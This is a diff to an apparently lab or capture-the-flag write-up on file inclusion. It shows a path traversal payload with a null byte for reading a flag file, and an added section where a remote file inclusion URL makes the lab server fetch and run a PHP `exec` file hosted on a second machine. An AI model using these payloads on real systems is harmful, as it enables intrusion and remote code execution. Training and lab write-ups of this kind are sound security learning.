@@ -518,6 +518,22 @@ POST data using parameter escaped the filter together with `NULL BYTE`
 `../../../../etc/flag3%00`
 ![flag](./media/5-challenge3.png)
 
+RCE LAB # PLAYGROUND
+
+created a file cmd.txt 
+```
+<?php 
+    print exec('hostname')
+?>
+```
+
+Then serve it as python server 
+![http](./media/5-http.png)
+
+
+Then access it in the url like this   
+`http://10.10.70.133/playground.php?file=http://10.10.210.23:8080/cmd.txt`
+![http](./media/5-rce.png)
 
 
 ---
